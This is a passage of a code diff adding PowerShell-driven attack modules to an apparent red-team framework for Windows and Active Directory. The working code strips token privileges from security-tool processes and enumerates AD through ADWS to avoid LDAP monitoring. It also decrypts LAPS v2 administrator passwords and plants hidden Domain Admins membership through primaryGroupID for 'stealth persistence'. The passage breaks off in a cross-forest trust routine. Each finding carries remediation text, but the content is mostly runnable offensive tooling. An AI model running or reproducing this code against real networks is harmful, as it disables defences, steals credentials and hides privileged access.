+            Write-Output "[+] FOUND: $($securityTools[$toolName]) (PID: $($p.Id), Name: $($p.ProcessName))"
+
+            # Try to enumerate token privileges
+            try {
+                $oa = New-Object TokenStomper+OBJECT_ATTRIBUTES
+                $oa.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($oa)
+                $cid = New-Object TokenStomper+CLIENT_ID
+                $cid.UniqueProcess = [IntPtr]$p.Id
+                $hProcess = [IntPtr]::Zero
+                $status = [TokenStomper]::NtOpenProcess([ref]$hProcess, 0x0400, [ref]$oa, [ref]$cid)
+                if ($status -eq 0) {
+                    $hToken = [IntPtr]::Zero
+                    $status2 = [TokenStomper]::NtOpenProcessToken($hProcess, 0x0008, [ref]$hToken)
+                    if ($status2 -eq 0) {
+                        Write-Output "    Token opened successfully — privileges can be stomped"
+                        [TokenStomper]::NtClose($hToken)
+                    } else {
+                        Write-Output "    Token access denied (PPL protected?)"
+                    }
+                    [TokenStomper]::NtClose($hProcess)
+                } else {
+                    Write-Output "    Process access denied (PPL/AM protected)"
+                }
+            } catch {
+                Write-Output "    Error: $_"
+            }
+        }
+    }
+}
+
+${targetProc ? `
+# Also check custom target
+$customProcs = Get-Process -Name "${targetProc}" -ErrorAction SilentlyContinue
+if ($customProcs) {
+    foreach ($p in $customProcs) {
+        $found += $p
+        Write-Output "[+] CUSTOM TARGET: $($p.ProcessName) (PID: $($p.Id))"
+    }
+}` : ""}
+
+if ($found.Count -eq 0) {
+    Write-Output "[-] No known security tools detected"
+}
+Write-Output ""
+Write-Output "[*] Total security tool processes found: $($found.Count)"
+` : `
+Write-Output "[*] Stomping token privileges on security tools..."
+$targetNames = ${targetProc ? `@("${targetProc}")` : "$securityTools.Keys"}
+$stompedCount = 0
+
+foreach ($toolName in $targetNames) {
+    $procs = Get-Process -Name $toolName -ErrorAction SilentlyContinue
+    if (-not $procs) { continue }
+
+    foreach ($p in $procs) {
+        Write-Output "[*] Targeting: $($p.ProcessName) (PID: $($p.Id))..."
+
+        $oa = New-Object TokenStomper+OBJECT_ATTRIBUTES
+        $oa.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($oa)
+        $cid = New-Object TokenStomper+CLIENT_ID
+        $cid.UniqueProcess = [IntPtr]$p.Id
+        $hProcess = [IntPtr]::Zero
+        $status = [TokenStomper]::NtOpenProcess([ref]$hProcess, 0x0400, [ref]$oa, [ref]$cid)
+
+        if ($status -ne 0) {
+            Write-Output "    [-] Cannot open process (NTSTATUS: 0x$($status.ToString('X8'))) — PPL/AM protected?"
+            continue
+        }
+
+        $hToken = [IntPtr]::Zero
+        $status2 = [TokenStomper]::NtOpenProcessToken($hProcess, 0x0028, [ref]$hToken)  # TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY
+        if ($status2 -ne 0) {
+            Write-Output "    [-] Cannot open token (NTSTATUS: 0x$($status2.ToString('X8')))"
+            [TokenStomper]::NtClose($hProcess)
+            continue
+        }
+
+        $removedCount = 0
+        foreach ($priv in $dangerousPrivs) {
+            $luid = New-Object TokenStomper+LUID
+            if ([TokenStomper]::LookupPrivilegeValue($null, $priv, [ref]$luid)) {
+                $tp = New-Object TokenStomper+TOKEN_PRIVILEGES
+                $tp.PrivilegeCount = 1
+                $tp.Privileges.Luid = $luid
+                $tp.Privileges.Attributes = 0x4  # SE_PRIVILEGE_REMOVED
+
+                $adjustResult = [TokenStomper]::NtAdjustPrivilegesToken($hToken, $false, [ref]$tp, 0, [IntPtr]::Zero, [IntPtr]::Zero)
+                if ($adjustResult -eq 0) {
+                    Write-Output "    [+] REMOVED: $priv"
+                    $removedCount++
+                } else {
+                    Write-Output "    [-] Cannot remove $priv (not held or protected)"
+                }
+            }
+        }
+
+        [TokenStomper]::NtClose($hToken)
+        [TokenStomper]::NtClose($hProcess)
+
+        if ($removedCount -gt 0) {
+            Write-Output "    [+] Stomped $removedCount privileges from $($p.ProcessName)"
+            $stompedCount++
+        }
+    }
+}
+
+Write-Output ""
+Write-Output "[+] Total processes stomped: $stompedCount"
+`}
+`
+
+  const result = await ps(script, timeout)
+  output.push(result.stdout)
+
+  const foundMatch = result.stdout.match(/Total.*?:\s*(\d+)/)
+  const count = foundMatch ? parseInt(foundMatch[1]) : 0
+  if (count > 0) {
+    findings.push({
+      checkId: "WIN-STOMP-001",
+      provider: "windows",
+      severity: action === "stomp" ? "critical" : "informational",
+      status: action === "stomp" ? "EXPLOITED" : "ENUMERATED",
+      resource: "process://security-tools",
+      title: action === "stomp" ? `${count} security tool tokens stomped` : `${count} security tools detected`,
+      details: result.stdout.substring(0, 500),
+      remediation: "Enable PPL for security tool processes. Monitor for NtAdjustPrivilegesToken calls on security processes.",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+async function adwsRecon(args: string[], timeout: number): Promise<HookResult> {
+  const server = argVal(args, "--server")
+  const scope = argVal(args, "--scope") || "all"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] ADWS Reconnaissance (port 9389 — bypasses LDAP monitoring)...\n"]
+
+  const script = `
+${server ? `$dcHost = "${server}"` : `$dcHost = ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name)`}
+Write-Output "[*] Target DC: $dcHost (ADWS port 9389)"
+
+# Test ADWS availability
+try {
+    $tcp = New-Object System.Net.Sockets.TcpClient
+    $tcp.Connect($dcHost, 9389)
+    $tcp.Close()
+    Write-Output "[+] ADWS port 9389 is OPEN"
+} catch {
+    Write-Output "[!] ADWS port 9389 not accessible — falling back to LDAP"
+    Write-Output "    ADWS should always be available on DCs with AD DS installed"
+    exit 1
+}
+
+# Use RSAT AD module (uses ADWS internally, NOT LDAP)
+# Check if AD module is available
+$adModule = Get-Module -ListAvailable ActiveDirectory -ErrorAction SilentlyContinue
+if (-not $adModule) {
+    Write-Output "[!] ActiveDirectory module not available — using raw ADWS SOAP"
+    Write-Output "[*] Attempting ADWS via .NET System.ServiceModel..."
+
+    # Raw ADWS query via WCF
+    $binding = New-Object System.ServiceModel.NetTcpBinding
+    $binding.Security.Mode = "Transport"
+    $binding.Security.Transport.ClientCredentialType = "Windows"
+    $endpoint = New-Object System.ServiceModel.EndpointAddress("net.tcp://$($dcHost):9389/ActiveDirectoryWebServices/Windows/Resource")
+
+    Write-Output "[+] ADWS binding configured"
+    Write-Output "    Endpoint: net.tcp://$($dcHost):9389/ActiveDirectoryWebServices/Windows/Resource"
+    Write-Output ""
+    Write-Output "[*] Note: Install RSAT (Add-WindowsCapability -Name Rsat.ActiveDirectory.DS-LDS.Tools) for full ADWS enum"
+    Write-Output "    RSAT Get-ADUser/Get-ADGroup/Get-ADComputer use ADWS internally"
+    Write-Output "    This bypasses ALL LDAP-based monitoring, IDS signatures, and audit logs"
+} else {
+    Import-Module ActiveDirectory -ErrorAction SilentlyContinue
+    Write-Output "[+] ActiveDirectory module loaded (all queries go via ADWS, not LDAP)"
+    Write-Output ""
+
+    ${scope === "all" || scope === "users" ? `
+    # Users
+    Write-Output "=== USERS (via ADWS) ==="
+    $users = Get-ADUser -Filter * -Properties adminCount,Enabled,LastLogonDate,PasswordLastSet,ServicePrincipalName,DoesNotRequirePreAuth -Server $dcHost
+    $enabledUsers = $users | Where-Object { $_.Enabled }
+    $adminUsers = $users | Where-Object { $_.adminCount -eq 1 }
+    $kerberoastable = $users | Where-Object { $_.ServicePrincipalName -and $_.Enabled }
+    $asrepRoastable = $users | Where-Object { $_.DoesNotRequirePreAuth -and $_.Enabled }
+    Write-Output "[+] Total users: $($users.Count) (Enabled: $($enabledUsers.Count))"
+    Write-Output "[+] Admin users (adminCount=1): $($adminUsers.Count)"
+    foreach ($u in $adminUsers) { Write-Output "    $($u.SamAccountName) — LastLogon: $($u.LastLogonDate)" }
+    Write-Output "[+] Kerberoastable (SPN + enabled): $($kerberoastable.Count)"
+    foreach ($u in $kerberoastable) { Write-Output "    $($u.SamAccountName) — SPN: $($u.ServicePrincipalName -join ', ')" }
+    Write-Output "[+] AS-REP Roastable: $($asrepRoastable.Count)"
+    foreach ($u in $asrepRoastable) { Write-Output "    $($u.SamAccountName)" }
+    Write-Output ""` : ""}
+
+    ${scope === "all" || scope === "groups" ? `
+    # Privileged Groups
+    Write-Output "=== PRIVILEGED GROUPS (via ADWS) ==="
+    $privGroups = @("Domain Admins","Enterprise Admins","Schema Admins","Backup Operators","Account Operators","Server Operators","DnsAdmins","Cert Publishers","Key Admins","Enterprise Key Admins")
+    foreach ($grp in $privGroups) {
+        try {
+            $members = Get-ADGroupMember $grp -Server $dcHost -ErrorAction SilentlyContinue
+            if ($members) {
+                Write-Output "[+] $grp ($($members.Count) members):"
+                foreach ($m in $members) { Write-Output "    $($m.SamAccountName) ($($m.objectClass))" }
+            }
+        } catch {}
+    }
+    Write-Output ""` : ""}
+
+    ${scope === "all" || scope === "computers" ? `
+    # Computers
+    Write-Output "=== COMPUTERS (via ADWS) ==="
+    $computers = Get-ADComputer -Filter * -Properties OperatingSystem,LastLogonDate,TrustedForDelegation,msDS-AllowedToDelegateTo -Server $dcHost
+    $dcs = $computers | Where-Object { $_.DistinguishedName -match "OU=Domain Controllers" }
+    $unconstrainedDeleg = $computers | Where-Object { $_.TrustedForDelegation -and $_.DistinguishedName -notmatch "OU=Domain Controllers" }
+    Write-Output "[+] Total computers: $($computers.Count), Domain Controllers: $($dcs.Count)"
+    if ($unconstrainedDeleg) {
+        Write-Output "[!] Non-DC with unconstrained delegation: $($unconstrainedDeleg.Count)"
+        foreach ($c in $unconstrainedDeleg) { Write-Output "    $($c.Name) — $($c.OperatingSystem)" }
+    }
+    Write-Output ""` : ""}
+
+    ${scope === "all" || scope === "trusts" ? `
+    # Trusts
+    Write-Output "=== TRUSTS (via ADWS) ==="
+    $trusts = Get-ADTrust -Filter * -Server $dcHost -ErrorAction SilentlyContinue
+    foreach ($t in $trusts) {
+        Write-Output "[+] Trust: $($t.Name) — Direction: $($t.Direction), Type: $($t.TrustType)"
+        Write-Output "    SID Filtering: $($t.SIDFilteringQuarantined), Selective Auth: $($t.SelectiveAuthentication)"
+        if (-not $t.SIDFilteringQuarantined) {
+            Write-Output "    [!] SID Filtering DISABLED — cross-trust SID injection possible"
+        }
+    }
+    Write-Output ""` : ""}
+
+    ${scope === "all" || scope === "gpos" ? `
+    # GPOs
+    Write-Output "=== GPOs (via ADWS) ==="
+    $gpos = Get-GPO -All -Server $dcHost -ErrorAction SilentlyContinue
+    Write-Output "[+] Total GPOs: $($gpos.Count)"
+    foreach ($g in $gpos) {
+        Write-Output "    $($g.DisplayName) — Modified: $($g.ModificationTime)"
+    }
+    Write-Output ""` : ""}
+
+    ${scope === "all" || scope === "acls" ? `
+    # AdminSDHolder ACL
+    Write-Output "=== AdminSDHolder ACL (via ADWS) ==="
+    $domainDN = (Get-ADDomain -Server $dcHost).DistinguishedName
+    $adminSDHolder = Get-ADObject "CN=AdminSDHolder,CN=System,$domainDN" -Properties nTSecurityDescriptor -Server $dcHost
+    $acl = $adminSDHolder.nTSecurityDescriptor
+    $rules = $acl.Access
+    Write-Output "[+] AdminSDHolder ACEs: $($rules.Count)"
+    foreach ($rule in $rules) {
+        if ($rule.AccessControlType -eq "Allow" -and $rule.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner") {
+            $identity = $rule.IdentityReference.Value
+            Write-Output "    [!] DANGEROUS: $identity has $($rule.ActiveDirectoryRights)"
+        }
+    }
+    Write-Output ""` : ""}
+}
+
+Write-Output "[+] ADWS reconnaissance complete"
+Write-Output "    All queries sent via port 9389 — LDAP monitoring was BYPASSED"
+`
+
+  const result = await ps(script, timeout)
+  output.push(result.stdout)
+
+  findings.push({
+    checkId: "WIN-ADWS-001",
+    provider: "windows",
+    severity: "informational",
+    status: "ENUMERATED",
+    resource: `adws://${server || "domain"}`,
+    title: "AD enumeration completed via ADWS (LDAP bypassed)",
+    details: "All reconnaissance performed via ADWS port 9389 — no LDAP queries generated",
+    remediation: "Monitor ADWS port 9389 traffic. Enable Windows Event Forwarding for AD Web Services logs.",
+  })
+
+  return { output: output.join("\n"), findings }
+}
+
+async function lapsV2Decrypt(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "enum"
+  const computer = argVal(args, "--computer")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Windows LAPS v2 Encrypted Password Operations...\n"]
+
+  const script = `
+$configNC = ([ADSI]"LDAP://RootDSE").configurationNamingContext
+$defaultNC = ([ADSI]"LDAP://RootDSE").defaultNamingContext
+
+${action === "enum" ? `
+Write-Output "[*] Enumerating Windows LAPS v2 (encrypted password) deployment..."
+
+# Check schema for LAPS v2 attributes
+$schemaSearcher = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new("LDAP://CN=Schema,CN=Configuration,$defaultNC"))
+$lapsV2Attrs = @("msLAPS-PasswordExpirationTime", "msLAPS-Password", "msLAPS-EncryptedPassword", "msLAPS-EncryptedDSRMPassword", "msLAPS-EncryptedDSRMPasswordHistory")
+$foundAttrs = @()
+foreach ($attr in $lapsV2Attrs) {
+    $schemaSearcher.Filter = "(lDAPDisplayName=$attr)"
+    $result = $schemaSearcher.FindOne()
+    if ($result) {
+        $foundAttrs += $attr
+        Write-Output "[+] Schema attribute found: $attr"
+    }
+}
+
+if ($foundAttrs.Count -eq 0) {
+    Write-Output "[-] Windows LAPS v2 schema not extended — LAPS v2 not deployed"
+    exit 0
+}
+
+# Find computers with encrypted LAPS passwords
+$searcher = [System.DirectoryServices.DirectorySearcher]::new()
+${computer ? `$searcher.Filter = "(&(objectClass=computer)(msLAPS-EncryptedPassword=*)(cn=${computer}))"` : '$searcher.Filter = "(&(objectClass=computer)(msLAPS-EncryptedPassword=*))"'}
+$searcher.PropertiesToLoad.AddRange(@("cn","dNSHostName","msLAPS-EncryptedPassword","msLAPS-PasswordExpirationTime","msLAPS-Password","operatingSystem"))
+$computers = $searcher.FindAll()
+
+Write-Output ""
+Write-Output "[+] Computers with encrypted LAPS passwords: $($computers.Count)"
+foreach ($comp in $computers) {
+    $cn = $comp.Properties["cn"][0]
+    $dns = $comp.Properties["dNSHostName"]
+    $os = $comp.Properties["operatingSystem"]
+    $expiry = $comp.Properties["msLAPS-PasswordExpirationTime"]
+
+    Write-Output "    Computer: $cn"
+    if ($dns.Count -gt 0) { Write-Output "    DNS: $($dns[0])" }
+    if ($os.Count -gt 0) { Write-Output "    OS: $($os[0])" }
+    if ($expiry.Count -gt 0) {
+        $expiryDate = [DateTime]::FromFileTime([Int64]$expiry[0])
+        Write-Output "    Password expires: $expiryDate"
+        if ($expiryDate -lt (Get-Date)) {
+            Write-Output "    [!] PASSWORD EXPIRED — may be rotated on next GP refresh"
+        }
+    }
+
+    # Check for unencrypted password too
+    $plainPw = $comp.Properties["msLAPS-Password"]
+    if ($plainPw.Count -gt 0) {
+        Write-Output "    [!] UNENCRYPTED password also present (use laps_dump to read)"
+    }
+
+    # Check encrypted password blob size
+    $encPw = $comp.Properties["msLAPS-EncryptedPassword"]
+    if ($encPw.Count -gt 0) {
+        $blob = [byte[]]$encPw[0]
+        Write-Output "    Encrypted blob size: $($blob.Length) bytes (DPAPI-NG encrypted)"
+    }
+    Write-Output ""
+}
+
+# Check who can read LAPS passwords
+Write-Output "[*] Checking LAPS read permissions..."
+$searcher2 = [System.DirectoryServices.DirectorySearcher]::new()
+$searcher2.Filter = "(&(objectClass=computer)(msLAPS-EncryptedPassword=*))"
+$first = $searcher2.FindOne()
+if ($first) {
+    $entry = $first.GetDirectoryEntry()
+    $acl = $entry.ObjectSecurity
+    $rules = $acl.GetAccessRules($true, $true, [System.Security.Principal.NTAccount])
+    $lapsReaders = @()
+    foreach ($rule in $rules) {
+        if ($rule.AccessControlType -eq "Allow") {
+            $propGuid = $rule.ObjectType.ToString()
+            # msLAPS-EncryptedPassword property GUID
+            if ($propGuid -eq "00000000-0000-0000-0000-000000000000" -or
+                $rule.ActiveDirectoryRights -match "GenericAll|ReadProperty") {
+                $lapsReaders += $rule.IdentityReference.Value
+            }
+        }
+    }
+    $lapsReaders = $lapsReaders | Select-Object -Unique
+    Write-Output "[+] Principals that can read LAPS passwords:"
+    foreach ($r in $lapsReaders) { Write-Output "    $r" }
+}
+` : `
+Write-Output "[*] Attempting Windows LAPS v2 encrypted password decryption..."
+${!computer ? 'Write-Output "[!] Required: --computer COMPUTER_NAME"; exit 1' : ""}
+
+# Read the encrypted blob
+$searcher = [System.DirectoryServices.DirectorySearcher]::new()
+$searcher.Filter = "(&(objectClass=computer)(cn=${computer})(msLAPS-EncryptedPassword=*))"
+$searcher.PropertiesToLoad.AddRange(@("cn","msLAPS-EncryptedPassword"))
+$result = $searcher.FindOne()
+
+if (-not $result) {
+    Write-Output "[-] Computer '${computer}' not found or has no encrypted LAPS password"
+    exit 1
+}
+
+$encBlob = [byte[]]($result.Properties["msLAPS-EncryptedPassword"][0])
+Write-Output "[+] Encrypted blob retrieved: $($encBlob.Length) bytes"
+
+# DPAPI-NG decryption via NCryptUnprotectSecret
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+
+public class DpapiNG {
+    [DllImport("ncrypt.dll")]
+    public static extern int NCryptUnprotectSecret(
+        out IntPtr phDescriptor,
+        uint dwFlags,
+        byte[] pbProtectedBlob,
+        uint cbProtectedBlob,
+        IntPtr pMemPara,
+        IntPtr hWnd,
+        out IntPtr ppbData,
+        out uint pcbData);
+
+    [DllImport("ncrypt.dll")]
+    public static extern int NCryptFreeBuffer(IntPtr pvInput);
+
+    public const uint NCRYPT_SILENT_FLAG = 0x00000040;
+}
+"@
+
+try {
+    $hDesc = [IntPtr]::Zero
+    $pData = [IntPtr]::Zero
+    $cbData = [uint32]0
+
+    # Skip the first 16 bytes (LAPS header: timestamp + flags)
+    $dpapiBlob = New-Object byte[] ($encBlob.Length - 16)
+    [Array]::Copy($encBlob, 16, $dpapiBlob, 0, $dpapiBlob.Length)
+
+    $status = [DpapiNG]::NCryptUnprotectSecret(
+        [ref]$hDesc, 0x40,
+        $dpapiBlob, [uint32]$dpapiBlob.Length,
+        [IntPtr]::Zero, [IntPtr]::Zero,
+        [ref]$pData, [ref]$cbData)
+
+    if ($status -eq 0 -and $pData -ne [IntPtr]::Zero) {
+        $decrypted = New-Object byte[] $cbData
+        [System.Runtime.InteropServices.Marshal]::Copy($pData, $decrypted, 0, [int]$cbData)
+        [DpapiNG]::NCryptFreeBuffer($pData)
+
+        $jsonStr = [System.Text.Encoding]::Unicode.GetString($decrypted)
+        Write-Output "[+] DECRYPTED Windows LAPS v2 password for ${computer}:"
+        Write-Output $jsonStr
+    } else {
+        Write-Output "[-] NCryptUnprotectSecret failed (HRESULT: 0x$($status.ToString('X8')))"
+        Write-Output "    This usually means current user is not authorized to decrypt"
+        Write-Output "    Requires: membership in the LAPS password readers group or Domain Admin"
+        Write-Output "    Alternative: Extract domain DPAPI-NG backup key with dpapi_domain"
+    }
+} catch {
+    Write-Output "[!] Decryption error: $($_.Exception.Message)"
+}
+`}
+`
+
+  const result = await ps(script, timeout)
+  output.push(result.stdout)
+
+  if (action === "enum") {
+    const countMatch = result.stdout.match(/encrypted LAPS passwords:\s*(\d+)/)
+    const count = countMatch ? parseInt(countMatch[1]) : 0
+    if (count > 0) {
+      findings.push({
+        checkId: "WIN-LAPS2-001",
+        provider: "windows",
+        severity: "high",
+        status: "ENUMERATED",
+        resource: "laps://v2-encrypted",
+        title: `${count} computers with Windows LAPS v2 encrypted passwords`,
+        details: "Encrypted LAPS passwords found — decryptable with domain backup key or authorized principal",
+        remediation: "Restrict LAPS password read permissions. Monitor msLAPS-EncryptedPassword attribute access.",
+      })
+    }
+  } else if (result.stdout.includes("DECRYPTED")) {
+    findings.push({
+      checkId: "WIN-LAPS2-002",
+      provider: "windows",
+      severity: "critical",
+      status: "EXTRACTED",
+      resource: `laps://${computer}`,
+      title: `Windows LAPS v2 encrypted password decrypted for ${computer}`,
+      details: "DPAPI-NG protected LAPS password successfully decrypted",
+      remediation: "Rotate LAPS password immediately. Review LAPS read permissions.",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+async function primaryGroupAbuse(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "check"
+  const target = argVal(args, "--target")
+  const groupRid = argVal(args, "--group-rid") || "512"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Primary Group ID Manipulation...\n"]
+
+  if (!target && action !== "check") return { output: "[!] Required: --target USER", findings }
+
+  const script = `
+$domainDN = ([ADSI]"LDAP://RootDSE").defaultNamingContext
+
+${action === "check" ? `
+Write-Output "[*] Checking primaryGroupID usage across domain..."
+
+# Well-known group RIDs
+$groupNames = @{
+    512 = "Domain Admins"
+    513 = "Domain Users"
+    514 = "Domain Guests"
+    515 = "Domain Computers"
+    516 = "Domain Controllers"
+    518 = "Schema Admins"
+    519 = "Enterprise Admins"
+    520 = "Group Policy Creator Owners"
+    521 = "Read-Only Domain Controllers"
+    553 = "RAS and IAS Servers"
+}
+
+# Find users with non-default primaryGroupID
+$searcher = [System.DirectoryServices.DirectorySearcher]::new()
+${target ? `$searcher.Filter = "(&(objectCategory=person)(objectClass=user)(sAMAccountName=${target}))"` : '$searcher.Filter = "(&(objectCategory=person)(objectClass=user)(!primaryGroupID=513))"'}
+$searcher.PropertiesToLoad.AddRange(@("sAMAccountName","primaryGroupID","adminCount","memberOf"))
+$results = $searcher.FindAll()
+
+Write-Output "[+] Users with non-default primaryGroupID:"
+$suspiciousCount = 0
+foreach ($r in $results) {
+    $sam = $r.Properties["sAMAccountName"][0]
+    $pgid = [int]$r.Properties["primaryGroupID"][0]
+    $groupName = if ($groupNames.ContainsKey($pgid)) { $groupNames[$pgid] } else { "RID $pgid" }
+    $adminCount = $r.Properties["adminCount"]
+
+    Write-Output "    $sam — primaryGroupID: $pgid ($groupName)"
+    if ($adminCount.Count -gt 0 -and $adminCount[0] -eq 1) {
+        Write-Output "        adminCount: 1 (protected by AdminSDHolder)"
+    }
+
+    # Check if this membership is "hidden" from net group
+    if ($pgid -eq 512 -or $pgid -eq 519 -or $pgid -eq 518) {
+        $suspiciousCount++
+        Write-Output "        [!] STEALTH: This user is effectively a member of $groupName"
+        Write-Output "            'net group \"$groupName\"' will NOT show this user"
+        Write-Output "            Only LDAP query for primaryGroupID reveals this"
+    }
+}
+
+if ($suspiciousCount -gt 0) {
+    Write-Output ""
+    Write-Output "[!] $suspiciousCount users have hidden privileged group membership via primaryGroupID"
+} elseif ($results.Count -eq 0) {
+    Write-Output "    (none found — all users have default primaryGroupID=513)"
+}
+` : action === "modify" ? `
+Write-Output "[*] Modifying primaryGroupID for ${target || "unknown"}..."
+${!target ? 'Write-Output "[!] Required: --target USER"; exit 1' : ""}
+
+$targetRid = ${groupRid}
+$groupNames = @{ 512 = "Domain Admins"; 518 = "Schema Admins"; 519 = "Enterprise Admins" }
+$groupName = if ($groupNames.ContainsKey($targetRid)) { $groupNames[$targetRid] } else { "RID $targetRid" }
+
+# First, the user MUST be a member of the target group
+# primaryGroupID can only be set to a group the user is already a member of
+$searcher = [System.DirectoryServices.DirectorySearcher]::new()
+$searcher.Filter = "(&(objectCategory=person)(objectClass=user)(sAMAccountName=${target}))"
+$searcher.PropertiesToLoad.AddRange(@("distinguishedName","primaryGroupID","memberOf"))
+$result = $searcher.FindOne()
+
+if (-not $result) {
+    Write-Output "[-] User '${target}' not found"
+    exit 1
+}
+
+$userDN = $result.Properties["distinguishedName"][0]
+$currentPGID = [int]$result.Properties["primaryGroupID"][0]
+Write-Output "[+] Current primaryGroupID: $currentPGID"
+
+# Check if user is member of target group
+$groupSearcher = [System.DirectoryServices.DirectorySearcher]::new()
+$groupSearcher.Filter = "(&(objectClass=group)(objectSid=*$targetRid))"
+# This is simplified — actual SID construction would be needed for proper matching
+
+# Try to set primaryGroupID
+try {
+    $userEntry = [System.DirectoryServices.DirectoryEntry]::new("LDAP://$userDN")
+    Write-Output "[*] Adding ${target} to $groupName first (required before primaryGroupID change)..."
+
+    # Find the group DN
+    $domainSid = (New-Object System.Security.Principal.NTAccount($env:USERDOMAIN, "Domain Admins")).Translate([System.Security.Principal.SecurityIdentifier]).AccountDomainSid
+    $groupSid = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::AccountDomainAdminsSid, $domainSid)
+
+    $groupSearcher2 = [System.DirectoryServices.DirectorySearcher]::new()
+    $groupSearcher2.Filter = "(&(objectClass=group)(objectSid=$($groupSid.Value)))"
+    $groupResult = $groupSearcher2.FindOne()
+
+    if ($groupResult) {
+        $groupEntry = $groupResult.GetDirectoryEntry()
+        try {
+            $groupEntry.Add("LDAP://$userDN")
+            $groupEntry.CommitChanges()
+            Write-Output "[+] Added ${target} to group"
+        } catch {
+            Write-Output "[*] User may already be a member"
+        }
+    }
+
+    # Now set primaryGroupID
+    $userEntry.Put("primaryGroupID", $targetRid)
+    $userEntry.SetInfo()
+    Write-Output "[+] primaryGroupID set to $targetRid ($groupName)"
+    Write-Output ""
+    Write-Output "[+] STEALTH PERSISTENCE ESTABLISHED:"
+    Write-Output "    ${target} is now effectively a $groupName member"
+    Write-Output "    'net group \"$groupName\"' will NOT show ${target}"
+    Write-Output "    Only LDAP: (primaryGroupID=$targetRid) reveals this membership"
+    Write-Output "    Survives password resets and most AD cleanup scripts"
+} catch {
+    Write-Output "[!] Failed to set primaryGroupID: $($_.Exception.Message)"
+    Write-Output "    Requires: WritePrimaryGroupID permission on the user object"
+}
+` : `
+# Revert
+Write-Output "[*] Reverting primaryGroupID to Domain Users (513)..."
+${!target ? 'Write-Output "[!] Required: --target USER"; exit 1' : ""}
+
+$searcher = [System.DirectoryServices.DirectorySearcher]::new()
+$searcher.Filter = "(&(objectCategory=person)(objectClass=user)(sAMAccountName=${target}))"
+$result = $searcher.FindOne()
+if (-not $result) { Write-Output "[-] User not found"; exit 1 }
+
+$userDN = $result.Properties["distinguishedName"][0]
+$currentPGID = [int]$result.Properties["primaryGroupID"][0]
+Write-Output "[+] Current primaryGroupID: $currentPGID"
+
+try {
+    $userEntry = [System.DirectoryServices.DirectoryEntry]::new("LDAP://$userDN")
+    $userEntry.Put("primaryGroupID", 513)
+    $userEntry.SetInfo()
+    Write-Output "[+] primaryGroupID reverted to 513 (Domain Users)"
+} catch {
+    Write-Output "[!] Failed: $($_.Exception.Message)"
+}
+`}
+`
+
+  const result = await ps(script, timeout)
+  output.push(result.stdout)
+
+  if (action === "check") {
+    const suspMatch = result.stdout.match(/(\d+) users have hidden/)
+    if (suspMatch) {
+      findings.push({
+        checkId: "WIN-PGID-001",
+        provider: "windows",
+        severity: "high",
+        status: "ENUMERATED",
+        resource: "ad://primaryGroupID",
+        title: `${suspMatch[1]} users with hidden privileged group membership`,
+        details: "Users with primaryGroupID set to privileged groups are invisible to 'net group' enumeration",
+        remediation: "Audit primaryGroupID values across all users. Reset non-standard values to 513 (Domain Users).",
+      })
+    }
+  } else if (action === "modify" && result.stdout.includes("STEALTH PERSISTENCE")) {
+    findings.push({
+      checkId: "WIN-PGID-002",
+      provider: "windows",
+      severity: "critical",
+      status: "EXPLOITED",
+      resource: `ad://${target}`,
+      title: `primaryGroupID stealth persistence on ${target}`,
+      details: `Set primaryGroupID to ${groupRid} — invisible to net group enumeration`,
+      remediation: "Check primaryGroupID with LDAP query. Reset to 513 and audit who modified it.",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+async function crossForest(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "enum"
+  const targetForest = argVal(args, "--target-forest")
+  const vector = argVal(args, "--vector")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Inter-Forest Trust Operations...\n"]
+
+  const script = `
+${action === "enum" ? `
+Write-Output "[*] Enumerating trust relationships..."
+
+# Get current domain/forest info
+try {
+    $currentDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+    $currentForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
+    Write-Output "[+] Current Domain: $($currentDomain.Name)"
+    Write-Output "[+] Current Forest: $($currentForest.Name)"
+    Write-Output "[+] Forest Root: $($currentForest.RootDomain)"
+    Write-Output "[+] Forest Functional Level: $($currentForest.ForestMode)"
+    Write-Output ""
+} catch {
+    Write-Output "[!] Cannot get domain/forest info: $_"
+    exit 1
+}
+
+# Enumerate domain trusts
+Write-Output "=== DOMAIN TRUSTS ==="
+$domainTrusts = $currentDomain.GetAllTrustRelationships()
+foreach ($trust in $domainTrusts) {
+    Write-Output "[+] Trust: $($trust.TargetName)"
+    Write-Output "    Direction: $($trust.TrustDirection)"
+    Write-Output "    Type: $($trust.TrustType)"
+
+    # Check trust attributes via LDAP
+    $searcher = [System.DirectoryServices.DirectorySearcher]::new()
+    $searcher.Filter = "(&(objectClass=trustedDomain)(name=$($trust.TargetName)))"
+    $searcher.PropertiesToLoad.AddRange(@("trustAttributes","trustDirection","trustType","securityIdentifier","flatName"))
+    $trustObj = $searcher.FindOne()
+
+    if ($trustObj) {
+        $attrs = [int]$trustObj.Properties["trustAttributes"][0]
+        $isSIDFiltered = ($attrs -band 0x4) -ne 0  # TRUST_ATTRIBUTE_QUARANTINED_DOMAIN
+        $isForestTransitive = ($attrs -band 0x8) -ne 0  # TRUST_ATTRIBUTE_FOREST_TRANSITIVE
+        $isPAM = ($attrs -band 0x400) -ne 0  # TRUST_ATTRIBUTE_PIM_TRUST
+        $isSelectiveAuth = ($attrs -band 0x20) -ne 0  # TRUST_ATTRIBUTE_CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION
+
+        Write-Output "    Trust Attributes: 0x$($attrs.ToString('X'))"
